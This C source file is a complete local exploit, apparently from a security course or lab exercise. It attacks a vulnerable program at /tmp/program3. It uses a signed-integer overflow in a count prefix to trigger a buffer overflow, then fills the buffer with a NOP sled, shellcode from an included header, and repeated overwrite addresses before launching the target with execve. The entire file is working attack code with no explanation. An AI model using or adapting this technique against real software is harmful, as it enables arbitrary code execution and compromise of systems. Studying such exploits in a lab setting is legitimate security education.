#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define PROGRAM "/tmp/program3"

int main(void)
{
  char *args[3];
  char *environ[1];
  char *count = "2147484533,"; //max int 2147483647+886
  int wid_size = 64;
  char data[56640]; //signed count*64
  int shellcode_len = strlen(shellcode);

  memset(data, 0x90, sizeof(data));
  memcpy(data + 5000, shellcode, shellcode_len);
  for (int i = 56576; i < 56620; i += 4) {
	  memcpy(data +i, "\x40\x24\xfe\xff", 4);
  }

  char exploit_str[sizeof(data) + strlen(count)];
  memcpy(exploit_str, count, strlen(count));
  memcpy(exploit_str + strlen(count), data, sizeof(data));

  args[0] = PROGRAM;
  args[1] = exploit_str;
  args[2] = NULL;
  environ[0] = NULL;

  if (0 > execve(PROGRAM, args, environ))
    fprintf(stderr, "call to execve failed.\n");

  return 0;
}
